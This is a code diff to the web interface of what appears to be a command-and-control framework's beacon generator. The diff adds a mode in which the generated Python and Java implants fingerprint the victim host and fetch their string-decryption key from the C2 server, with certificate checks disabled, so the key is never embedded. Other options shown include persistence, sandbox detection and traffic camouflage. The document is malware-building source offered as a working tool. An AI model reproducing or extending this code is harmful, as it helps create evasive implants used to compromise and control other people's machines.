@@ -159,7 +159,7 @@ const LANG = {
     gen_add_fallback:'+ Add fallback', gen_sleep:'Sleep (seconds)', gen_jitter:'Jitter %',
     gen_persist:'Persistence (survives reboots)', gen_kill_date:'Kill Date (optional)',
     gen_kill_date_hint:'Beacon self-destructs after this date. Leave empty for no limit.',
-    gen_enc_mode:'String Encryption', gen_enc_xor:'XOR (fast, basic)', gen_enc_aes:'AES-256 / SHA-256 CTR (strong)',
+    gen_enc_mode:'String Encryption', gen_enc_server:'Server-side key delivery (strongest)', gen_enc_aes:'AES-256 / SHA-256 CTR (strong)', gen_enc_xor:'XOR (fast, basic)',
     gen_evasion:'Evasion',
     ev_traffic:'Traffic camouflage', ev_traffic_desc:'Fake browser User-Agent and real HTTP headers',
     ev_sandbox:'Sandbox detection', ev_sandbox_desc:'Detects VMs, sandboxes and analysis environments',
@@ -237,7 +237,7 @@ const LANG = {
     gen_add_fallback:'+ Agregar fallback', gen_sleep:'Sleep (segundos)', gen_jitter:'Jitter %',
     gen_persist:'Persistencia (sobrevive reinicios)', gen_kill_date:'Kill Date (opcional)',
     gen_kill_date_hint:'El beacon se autodestruye después de esta fecha. Vacío = sin límite.',
-    gen_enc_mode:'Cifrado de strings', gen_enc_xor:'XOR (rápido, básico)', gen_enc_aes:'AES-256 / SHA-256 CTR (fuerte)',
+    gen_enc_mode:'Cifrado de strings', gen_enc_server:'Llave desde servidor (máxima seguridad)', gen_enc_aes:'AES-256 / SHA-256 CTR (fuerte)', gen_enc_xor:'XOR (rápido, básico)',
     gen_evasion:'Evasión',
     ev_traffic:'Traffic camouflage', ev_traffic_desc:'Fake browser User-Agent y headers HTTP reales',
     ev_sandbox:'Sandbox detection', ev_sandbox_desc:'Detecta VMs, sandboxes y entornos de análisis',
@@ -1720,8 +1720,9 @@ function renderGenerateView() {
           <div class="form-group" style="margin:0;margin-top:12px">
             <label>${t('gen_enc_mode')}</label>
             <select id="gen-enc-mode" style="background:var(--bg3);border:1px solid var(--border);border-radius:6px;color:var(--text);font-family:var(--font-mono);font-size:12px;padding:8px 12px;outline:none;width:100%;cursor:pointer">
-              <option value="xor">${t('gen_enc_xor')}</option>
+              <option value="server">${t('gen_enc_server')}</option>
               <option value="aes">${t('gen_enc_aes')}</option>
+              <option value="xor">${t('gen_enc_xor')}</option>
             </select>
           </div>
         </div>
@@ -2451,14 +2452,29 @@ async function generateBeacon() {
   if (!res || !res.ok) { alert('Failed to get agent secret'); return; }
   const info = await res.json();
 
+  let bid = null, serverKey = null;
+  if (encMode === 'server') {
+    bid = crypto.randomUUID();
+    serverKey = Array.from(crypto.getRandomValues(new Uint8Array(16))).map(b => b.toString(16).padStart(2,'0')).join('');
+    const regRes = await apiFetch('/api/info/beacon/register-key', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({bid, key: serverKey})
+    });
+    if (!regRes || !regRes.ok) {
+      alert(_lang === 'es' ? 'Error al registrar la llave en el servidor' : 'Failed to register key on server');
+      return;
+    }
+  }
+
   let code, filename;
   if (_beaconLang === 'java') {
-    code = generateJavaBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode);
+    code = generateJavaBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode, bid, serverKey);
     filename = 'Beacon.java';
     document.getElementById('beacon-dl-buttons-py').style.display   = 'none';
     document.getElementById('beacon-dl-buttons-java').style.display = 'flex';
   } else {
-    code = generateBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode);
+    code = generateBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode, bid, serverKey);
     filename = 'beacon.py';
     document.getElementById('beacon-dl-buttons-py').style.display   = 'flex';
     document.getElementById('beacon-dl-buttons-java').style.display = 'none';
@@ -2529,19 +2545,21 @@ function _sEnc(str, seed) {
   return Array.from(out).map(b=>b.toString(16).padStart(2,'0')).join('');
 }
 
-function generateBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}, killDate = null, encMode = 'xor') {
+function generateBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}, killDate = null, encMode = 'xor', bid = null, serverKey = null) {
   if (!Array.isArray(urls)) urls = [urls];
   function xorEnc(str, key) {
     const enc = new TextEncoder();
     const b = enc.encode(str), k = enc.encode(key);
     return Array.from(b).map((c, i) => c ^ k[i % k.length]).map(c => c.toString(16).padStart(2, '0')).join('');
   }
-  const xk = encMode === 'aes'
-    ? Array.from(crypto.getRandomValues(new Uint8Array(16))).map(b => b.toString(16).padStart(2,'0')).join('')
-    : Array.from(crypto.getRandomValues(new Uint8Array(16))).map(b => String.fromCharCode(97 + b % 26)).join('');
-  const enc = (s) => encMode === 'aes' ? _sEnc(s, xk) : xorEnc(s, xk);
-  const eUrls = urls.map(u => enc(u));
-  const es = enc(secret);
+  const xk = encMode === 'server'
+    ? serverKey
+    : (encMode === 'aes'
+        ? Array.from(crypto.getRandomValues(new Uint8Array(16))).map(b => b.toString(16).padStart(2,'0')).join('')
+        : Array.from(crypto.getRandomValues(new Uint8Array(16))).map(b => String.fromCharCode(97 + b % 26)).join(''));
+  const enc = (s) => (encMode === 'aes' || encMode === 'server') ? _sEnc(s, xk) : xorEnc(s, xk);
+  const eUrls = encMode !== 'server' ? urls.map(u => enc(u)) : [];
+  const es    = encMode !== 'server' ? enc(secret) : '';
   // xPy: encrypts a string at generation time → emits _d("hex", _k) in Python source
   const xPy = s => `_d("${enc(s)}", _k)`;
 
@@ -2710,7 +2728,7 @@ _WIN = sys.platform == 'win32'
 SLEEP  = ${sleep}
 JITTER = ${jitter}
 ${killDateBlock}
-${encMode === 'aes' ? `# SHA-256 CTR decoded at runtime — key derived via 3×SHA-256, each string has unique IV
+${(encMode === 'aes' || encMode === 'server') ? `# SHA-256 CTR decoded at runtime — key derived via 3×SHA-256, each string has unique IV
 import hashlib as _hl
 def _d(h,sd):
     b=bytes.fromhex(h);iv=b[:8];ct=b[8:]
@@ -2721,9 +2739,35 @@ def _d(h,sd):
 def _d(h,k):
     b=bytes.fromhex(h);k=k.encode()
     return bytes([b[i]^k[i%len(k)] for i in range(len(b))]).decode()`}
-_k      = "${xk}"
+${encMode === 'server' ? `# Key never embedded — fetched from C2 on startup
+_k = None
+C2_URLS = [${urls.map(u => `"${u}"`).join(', ')}]
+SECRET  = "${secret}"
+
+def _fp():
+    try:
+        import uuid as _u; _mac=':'.join(('%012x'%_u.getnode())[i:i+2] for i in range(0,12,2))
+    except: _mac='unknown'
+    return _hl.sha256((socket.gethostname()+_mac).encode()).hexdigest()
+
+def _fetch_key():
+    global _k
+    _fing=_fp()
+    _body=_json.dumps({"bid":"${bid}","fp":_fing}).encode()
+    _ctx=ssl.create_default_context(); _ctx.check_hostname=False; _ctx.verify_mode=ssl.CERT_NONE
+    for _url in C2_URLS:
+        try:
+            _r=_req.Request(_url+"/api/beacon/key",data=_body,
+                headers={"Content-Type":"application/json","X-Agent-Secret":SECRET},method="POST")
+            with _req.urlopen(_r,context=_ctx,timeout=10) as _resp:
+                _k=_json.loads(_resp.read())["key"]; return True
+        except: continue
+    return False
+
+if not _fetch_key(): sys.exit(0)
+` : `_k      = "${xk}"
 C2_URLS = [_d(h, _k) for h in [${eUrls.map(e => `"${e}"`).join(', ')}]]
-SECRET  = _d("${es}", _k)
+SECRET  = _d("${es}", _k)`}
 _url_idx = 0
 
 _BASE    = os.path.dirname(os.path.abspath(__file__))
@@ -3139,19 +3183,21 @@ if __name__ == "__main__":
 `;
 }
 
-function generateJavaBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}, killDate = null, encMode = 'xor') {
+function generateJavaBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}, killDate = null, encMode = 'xor', bid = null, serverKey = null) {
   if (!Array.isArray(urls)) urls = [urls];
   function xorEnc(str, key) {
     const enc = new TextEncoder();
     const b = enc.encode(str), k = enc.encode(key);
     return Array.from(b).map((c, i) => c ^ k[i % k.length]).map(c => c.toString(16).padStart(2, '0')).join('');
   }
-  const xk = encMode === 'aes'
-    ? Array.from(crypto.getRandomValues(new Uint8Array(16))).map(b => b.toString(16).padStart(2,'0')).join('')
-    : Array.from(crypto.getRandomValues(new Uint8Array(16))).map(b => String.fromCharCode(97 + b % 26)).join('');
-  const enc = (s) => encMode === 'aes' ? _sEnc(s, xk) : xorEnc(s, xk);
-  const eUrls = urls.map(u => enc(u));
-  const es = enc(secret);
+  const xk = encMode === 'server'
+    ? serverKey
+    : (encMode === 'aes'
+        ? Array.from(crypto.getRandomValues(new Uint8Array(16))).map(b => b.toString(16).padStart(2,'0')).join('')
+        : Array.from(crypto.getRandomValues(new Uint8Array(16))).map(b => String.fromCharCode(97 + b % 26)).join(''));
+  const enc = (s) => (encMode === 'aes' || encMode === 'server') ? _sEnc(s, xk) : xorEnc(s, xk);
+  const eUrls = encMode !== 'server' ? urls.map(u => enc(u)) : [];
+  const es    = encMode !== 'server' ? enc(secret) : '';
   // xL: encrypts a string literal at generation time → emits xDec("hex", XK) in Java source
   // so sensitive strings never appear as plaintext in the .class constant pool
   const xL = s => `xDec("${enc(s)}", XK)`;
@@ -3296,7 +3342,10 @@ import java.security.cert.X509Certificate;
 
 public class Beacon {
 
-    private static final String XK = "${xk}";
+    ${encMode === 'server' ? `private static final String _BID = "${bid}";
+    private static final String[] C2_URLS = { ${urls.map(u => `"${u}"`).join(', ')} };
+    private static final String SECRET = "${secret}";
+    private static volatile String XK = null;` : `private static final String XK = "${xk}";
     private static final String[] _ENC_URLS = { ${eUrls.map(e => `"${e}"`).join(', ')} };
     private static final String[] C2_URLS;
     private static final String SECRET;
@@ -3304,7 +3353,7 @@ public class Beacon {
         SECRET = xDec("${es}", XK);
         C2_URLS = new String[_ENC_URLS.length];
         for (int i = 0; i < _ENC_URLS.length; i++) C2_URLS[i] = xDec(_ENC_URLS[i], XK);
-    }
+    }`}
 
     private static final int SLEEP  = ${sleep};
     private static final int JITTER = ${jitter};
@@ -3349,6 +3398,38 @@ public class Beacon {
         for (int i = 0; i < b.length; i++) b[i] ^= k[i % k.length];
         return new String(b, java.nio.charset.StandardCharsets.UTF_8);
     }`}
+
+    ${encMode === 'server' ? `// ── Server-side key fetch ─────────────────────────────────
+    private static boolean fetchKey() {
+        String fp;
+        try {
+            java.net.NetworkInterface ni = java.net.NetworkInterface.getByInetAddress(java.net.InetAddress.getLocalHost());
+            byte[] mac = ni != null ? ni.getHardwareAddress() : null;
+            String macStr = (mac != null) ? bytesToHex(mac) : "00";
+            java.security.MessageDigest md = java.security.MessageDigest.getInstance("SHA-256");
+            fp = bytesToHex(md.digest((java.net.InetAddress.getLocalHost().getHostName() + macStr).getBytes(java.nio.charset.StandardCharsets.UTF_8)));
+        } catch (Exception e) { fp = "00"; }
+        String body = "{\\"bid\\":\\"" + _BID + "\\",\\"fp\\":\\"" + fp + "\\"}";
+        for (String url : C2_URLS) {
+            try {
+                HttpURLConnection conn = (HttpURLConnection) new URL(url + "/api/beacon/key").openConnection();
+                if (conn instanceof HttpsURLConnection) {
+                    ((HttpsURLConnection) conn).setSSLSocketFactory(sslCtx.getSocketFactory());
+                    ((HttpsURLConnection) conn).setHostnameVerifier((h, s) -> true);
+                }
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json");
+                conn.setRequestProperty("X-Agent-Secret", SECRET);
+                conn.setConnectTimeout(10000); conn.setReadTimeout(10000);
+                conn.setDoOutput(true);
+                conn.getOutputStream().write(body.getBytes(java.nio.charset.StandardCharsets.UTF_8));
+                String resp = new String(conn.getInputStream().readAllBytes(), java.nio.charset.StandardCharsets.UTF_8);
+                String key = jsonGet(resp, "key");
+                if (key != null) { XK = key; return true; }
+            } catch (Exception ignored) {}
+        }
+        return false;
+    }` : ''}
 
     private static String bytesToHex(byte[] b) {
         StringBuilder sb = new StringBuilder();
@@ -3602,7 +3683,7 @@ public class Beacon {
 
     // ── Main loop ─────────────────────────────────────────────
     public static void main(String[] args) throws Exception {
-        initSsl();${sandboxCall}${bgCall}${persistCall}${killDateCall}
+        initSsl();${encMode === 'server' ? '\n        if (!fetchKey()) System.exit(0);' : ''}${sandboxCall}${bgCall}${persistCall}${killDateCall}
         agentId = getOrCreateId();
         cwd = System.getProperty("user.dir");
         int sleepMs = SLEEP * 1000;
